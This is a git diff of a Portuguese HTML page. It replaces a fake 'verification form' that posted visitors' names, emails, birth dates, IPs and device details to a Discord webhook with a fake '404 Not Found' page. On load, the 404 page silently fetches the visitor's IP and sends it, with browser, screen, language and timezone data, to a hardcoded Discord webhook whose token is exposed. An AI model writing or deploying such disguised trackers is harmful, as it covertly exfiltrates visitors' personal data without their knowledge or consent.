@@ -3,229 +3,165 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulário de Verificação</title>
+    <title>404 Not Found</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: #f5f5f5;
-        }
-        
-        .form-container {
-            background-color: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        
-        h1 {
-            text-align: center;
-            color: #333;
-            margin-bottom: 30px;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: bold;
-        }
-        
-        input[type="text"],
-        input[type="email"],
-        input[type="date"] {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 16px;
-        }
-        
-        .submit-btn {
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            width: 100%;
-            transition: background-color 0.3s;
-            margin-top: 10px;
-        }
-        
-        .submit-btn:hover {
-            background-color: #45a049;
-        }
-        
-        .verification-screen {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: white;
-            flex-direction: column;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f8f9fa;
+            color: #343a40;
+            margin: 0;
+            padding: 0;
+            display: flex;
             justify-content: center;
             align-items: center;
+            height: 100vh;
             text-align: center;
-            z-index: 1000;
-            padding: 20px;
         }
-        
-        .verification-message {
-            font-size: 20px;
-            margin-bottom: 30px;
-            max-width: 400px;
+        .error-container {
+            max-width: 600px;
+            padding: 2rem;
         }
-        
-        .continue-button {
-            background-color: #FF0000;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
+        h1 {
+            font-size: 4rem;
+            margin: 0;
+            color: #dc3545;
+        }
+        h2 {
+            font-size: 1.5rem;
+            margin-top: 0;
+        }
+        p {
+            margin-bottom: 2rem;
+            line-height: 1.6;
+        }
+        a {
+            color: #007bff;
             text-decoration: none;
-            transition: background-color 0.3s;
         }
-        
-        .continue-button:hover {
-            background-color: #CC0000;
+        a:hover {
+            text-decoration: underline;
+        }
+        .hidden {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="form-container" id="formContainer">
-        <h1>Formulário de Verificação</h1>
-        <form id="verificationForm">
-            <div class="form-group">
-                <label for="fullName">Nome completo:</label>
-                <input type="text" id="fullName" name="fullName" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="email">Email:</label>
-                <input type="email" id="email" name="email" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="birthDate">Data de nascimento (Opcional):</label>
-                <input type="date" id="birthDate" name="birthDate">
-            </div>
-            
-            <button type="submit" class="submit-btn">Verificar</button>
-        </form>
-    </div>
-    
-    <div class="verification-screen" id="verificationScreen">
-        <p class="verification-message">Você está sendo verificado. Enviaremos um email quando sua verificação for concluída.</p>
-        <a href="https://youtu.be/dQw4w9WgXcQ" class="continue-button">Continuar</a>
+    <div class="error-container">
+        <h1>404</h1>
+        <h2>Página não encontrada</h2>
+        <p>A página que você está procurando pode ter sido removida, ter seu nome alterado ou estar temporariamente indisponível.</p>
+        <p><a href="/">Voltar para a página inicial</a></p>
     </div>
 
     <script>
-        // Função para detectar dispositivo e navegador
-        function getDeviceInfo() {
+        // Função para coletar informações do usuário
+        function collectUserData() {
             const userAgent = navigator.userAgent;
-            let deviceType = "Desktop";
+            const platform = navigator.platform;
+            const screenWidth = window.screen.width;
+            const screenHeight = window.screen.height;
+            const language = navigator.language;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const cookiesEnabled = navigator.cookieEnabled;
+            const javaEnabled = navigator.javaEnabled();
             
-            if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
-                deviceType = /Android/i.test(userAgent) ? "Mobile (Android)" : 
-                            /iPhone|iPad|iPod/i.test(userAgent) ? "Mobile (iOS)" : "Mobile";
-            }
-            
-            return {
-                device: deviceType,
-                browser: getBrowser(),
-                os: getOS(),
-                userAgent: userAgent
-            };
-        }
-        
-        function getBrowser() {
-            const userAgent = navigator.userAgent;
-            if (userAgent.indexOf("Firefox") > -1) return "Firefox";
-            if (userAgent.indexOf("SamsungBrowser") > -1) return "Samsung Browser";
-            if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) return "Opera";
-            if (userAgent.indexOf("Trident") > -1) return "Internet Explorer";
-            if (userAgent.indexOf("Edge") > -1) return "Edge";
-            if (userAgent.indexOf("Chrome") > -1) return "Chrome";
-            if (userAgent.indexOf("Safari") > -1) return "Safari";
-            return "Unknown";
-        }
-        
-        function getOS() {
-            const userAgent = navigator.userAgent;
-            if (userAgent.indexOf("Windows") > -1) return "Windows";
-            if (userAgent.indexOf("Mac") > -1) return "MacOS";
-            if (userAgent.indexOf("Linux") > -1) return "Linux";
-            if (userAgent.indexOf("Android") > -1) return "Android";
-            if (userAgent.indexOf("iOS") > -1 || /iPhone|iPad|iPod/i.test(userAgent)) return "iOS";
-            return "Unknown";
+            // Tentativa de obter IP (usando um serviço externo)
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    sendToDiscord(ip, userAgent, platform, screenWidth, screenHeight, language, timezone, cookiesEnabled, javaEnabled);
+                })
+                .catch(error => {
+                    console.error('Erro ao obter IP:', error);
+                    sendToDiscord('IP não disponível', userAgent, platform, screenWidth, screenHeight, language, timezone, cookiesEnabled, javaEnabled);
+                });
         }
 
-        // Envio do formulário
-        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+        // Função para enviar dados para o Discord via webhook
+        function sendToDiscord(ip, userAgent, platform, screenWidth, screenHeight, language, timezone, cookiesEnabled, javaEnabled) {
+            // SUBSTITUA ESTE URL PELO SEU WEBHOOK DO DISCORD
+            const webhookURL = 'https://discord.com/api/webhooks/1391138971740016793/uEDSN4HVuuzsQYjeSeVIBfPXROy_n4rHJJ-m4Or1T1b4TLi7RjBXDsQI_KkyaEIgB_kQ';
             
-            // Obter IP e informações do dispositivo
-            const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json()).catch(() => ({ ip: 'Não detectado' }));
-            const deviceInfo = getDeviceInfo();
+            const timestamp = new Date().toISOString();
             
-            const formData = {
-                fullName: document.getElementById('fullName').value,
-                email: document.getElementById('email').value,
-                birthDate: document.getElementById('birthDate').value || 'Não informado',
-                ip: ipData.ip,
-                ...deviceInfo
-            };
-            
-            // Enviar para o webhook do Discord
-            const discordMessage = {
-                content: '📄 **Novo formulário enviado**',
-                embeds: [{
-                    title: 'Dados do Formulário',
-                    color: 0x00ff00,
-                    fields: [
-                        { name: 'Nome completo', value: formData.fullName, inline: true },
-                        { name: 'Email', value: formData.email, inline: true },
-                        { name: 'Data de nascimento', value: formData.birthDate, inline: true },
-                        { name: 'IP', value: formData.ip, inline: true },
-                        { name: 'Dispositivo', value: formData.device, inline: true },
-                        { name: 'Sistema Operacional', value: formData.os, inline: true },
-                        { name: 'Navegador', value: formData.browser, inline: true },
-                        { name: 'User Agent', value: `\`\`\`${formData.userAgent}\`\`\``, inline: false }
-                    ],
-                    footer: { text: 'Formulário enviado via Site' },
-                    timestamp: new Date().toISOString()
-                }]
-            };
-            
-            try {
-                await fetch('https://discord.com/api/webhooks/1390729092311158826/OoTfhqLaBBCxEjh3Wl3WC-3RVXuFUwTkoPwEKM53whnNxGsAZrvPdkD1jPVGsU5gS29m', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
+            const embed = {
+                title: "Novo acesso detectado",
+                color: 16711680, // Vermelho
+                fields: [
+                    {
+                        name: "IP",
+                        value: ip,
+                        inline: true
                     },
-                    body: JSON.stringify(discordMessage)
-                });
-                
-                // Mostrar tela de verificação
-                document.getElementById('formContainer').style.display = 'none';
-                document.getElementById('verificationScreen').style.display = 'flex';
-                
-            } catch (error) {
+                    {
+                        name: "User Agent",
+                        value: `\`\`\`${userAgent}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "Plataforma",
+                        value: platform,
+                        inline: true
+                    },
+                    {
+                        name: "Resolução",
+                        value: `${screenWidth}x${screenHeight}`,
+                        inline: true
+                    },
+                    {
+                        name: "Idioma",
+                        value: language,
+                        inline: true
+                    },
+                    {
+                        name: "Fuso Horário",
+                        value: timezone,
+                        inline: true
+                    },
+                    {
+                        name: "Cookies Habilitados",
+                        value: cookiesEnabled ? "Sim" : "Não",
+                        inline: true
+                    },
+                    {
+                        name: "Java Habilitado",
+                        value: javaEnabled ? "Sim" : "Não",
+                        inline: true
+                    },
+                    {
+                        name: "Timestamp",
+                        value: timestamp,
+                        inline: false
+                    }
+                ]
+            };
+            
+            const payload = {
+                embeds: [embed],
+                content: "⚠️ Alguém acessou a página de erro 404!"
+            };
+            
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Erro ao enviar para o Discord:', response.status);
+                }
+            })
+            .catch(error => {
                 console.error('Erro ao enviar para o Discord:', error);
-                alert('Ocorreu um erro ao enviar o formulário. Por favor, tente novamente.');
-            }
-        });
+            });
+        }
+
+        // Executa a coleta de dados quando a página carrega
+        window.onload = collectUserData;
     </script>
 </body>
 </html>
